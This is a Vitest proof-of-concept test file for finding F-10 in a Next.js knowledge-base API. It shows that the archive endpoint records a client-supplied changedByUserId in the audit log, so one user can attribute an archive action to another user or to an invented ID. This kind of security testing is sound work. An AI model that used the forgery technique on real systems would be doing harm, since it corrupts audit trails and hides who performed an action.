import { describe, it, expect, beforeEach, afterEach, afterAll } from 'vitest';
import { NextRequest } from 'next/server';
import { db } from '@/lib/db';
import { createSession } from '@/lib/sessions';
import { POST as archivePOST } from '@/app/api/company-knowledge/[id]/archive/route';
import {
  createTestUser,
  createTestCompany,
  createTestCompanyMember,
  clearDatabase,
} from '../helpers/factories';

const log = (...args: unknown[]) => console.log('[EVIDENCE]', ...args);

const createdCompanyIds = new Set<string>();

function authHeaders(token: string): Record<string, string> {
  return { 'Content-Type': 'application/json', Authorization: `Bearer ${token}` };
}

async function createKnowledgeEntity(companyId: string, name: string) {
  return db.companyKnowledge.create({
    data: {
      companyId,
      type: 'COMPANY',
      canonicalName: name,
      aliases: [],
      status: 'active',
      source: 'company_knowledge',
    },
  });
}

async function archiveCall(token: string, knowledgeId: string, companyId: string, changedByUserId?: string) {
  const body: Record<string, string> = {};
  if (changedByUserId !== undefined) body.changedByUserId = changedByUserId;
  body.reason = 'forensic f10';
  return archivePOST(
    new NextRequest(`http://localhost/api/company-knowledge/${knowledgeId}/archive?companyId=${companyId}`, {
      method: 'POST',
      headers: authHeaders(token),
      body: JSON.stringify(body),
    }),
    { params: Promise.resolve({ id: knowledgeId }) },
  );
}

describe('F-10 — changedByUserId taken from the request body (audit forgery) (dynamic PoC)', () => {
  beforeEach(async () => {
    await clearDatabase();
  });

  afterEach(async () => {
    const ids = [...createdCompanyIds];
    createdCompanyIds.clear();
    if (ids.length > 0) {
      const filter = { companyId: { in: ids } };
      await db.knowledgeAudit.deleteMany({ where: { companyKnowledge: filter } }).catch(() => {});
      await db.pendingApproval.deleteMany({ where: { companyKnowledge: filter } }).catch(() => {});
      await db.companyKnowledge.deleteMany({ where: filter }).catch(() => {});
      await db.companyMember.deleteMany({ where: filter }).catch(() => {});
      await db.company.deleteMany({ where: { id: { in: ids } } }).catch(() => {});
    }
    await clearDatabase();
  });

  afterAll(async () => {
    const auditForged = await db.knowledgeAudit.count({ where: { action: 'archive', source: 'company_knowledge' } });
    const knowledge = await db.companyKnowledge.count();
    log('AFTER-ALL DB STATE: archive audits =', auditForged, '| companyKnowledge rows =', knowledge);
  });

  it('Q1: archive accepts a changedByUserId from the body and writes it verbatim to KnowledgeAudit', async () => {
    const actor = await createTestUser('f10-actor@example.com');
    const victim = await createTestUser('f10-victim@example.com');
    const company = await createTestCompany('F10 Co');
    createdCompanyIds.add(company.id);
    await createTestCompanyMember(actor.id, company.id);

    const entity = await createKnowledgeEntity(company.id, 'F10 Entity');
    const token = await createSession(actor.id);

    const res = await archiveCall(token, entity.id, company.id, victim.id);
    const body = await res.json();
    const audit = await db.knowledgeAudit.findFirst({
      where: { knowledgeId: entity.id, action: 'archive' },
    });

    log('Q1: actor id =', actor.id, '| forged changedByUserId =', victim.id);
    log('Q1: POST /archive -> status =', res.status, '| response =', JSON.stringify(body));
    log('Q1: KnowledgeAudit.changedByUserId stored =', audit?.changedByUserId, '| equals forged =', audit?.changedByUserId === victim.id);
    log('Q1-FORGED: audit attributed to a user other than the authenticated actor =', audit?.changedByUserId === victim.id && victim.id !== actor.id);
    expect(res.status).toBe(200);
    expect(audit?.changedByUserId).toBe(victim.id);
    expect(audit?.changedByUserId).not.toBe(actor.id);
  });

  it('Q2: a non-existent changedByUserId is also accepted (no FK / no existence check)', async () => {
    const actor = await createTestUser('f10-actor2@example.com');
    const company = await createTestCompany('F10 Co');
    createdCompanyIds.add(company.id);
    await createTestCompanyMember(actor.id, company.id);

    const entity = await createKnowledgeEntity(company.id, 'F10 Entity 2');
    const token = await createSession(actor.id);

    const res = await archiveCall(token, entity.id, company.id, 'forged-nonexistent-user');
    const audit = await db.knowledgeAudit.findFirst({ where: { knowledgeId: entity.id, action: 'archive' } });

    log('Q2: POST /archive with changedByUserId="forged-nonexistent-user" -> status =', res.status);
    log('Q2: KnowledgeAudit.changedByUserId stored =', audit?.changedByUserId);
    expect(res.status).toBe(200);
    expect(audit?.changedByUserId).toBe('forged-nonexistent-user');
  });

  it('Q3 (control): without changedByUserId the archive fails — the server does not derive the author', async () => {
    const actor = await createTestUser('f10-actor3@example.com');
    const company = await createTestCompany('F10 Co');
    createdCompanyIds.add(company.id);
    await createTestCompanyMember(actor.id, company.id);

    const entity = await createKnowledgeEntity(company.id, 'F10 Entity 3');
    const token = await createSession(actor.id);

    const res = await archiveCall(token, entity.id, company.id);
    const body = await res.json();
    log('Q3: POST /archive WITHOUT changedByUserId -> status =', res.status, '| error =', JSON.stringify(body.error)?.slice(0, 100));
    expect(res.status).toBe(400);
  });
});
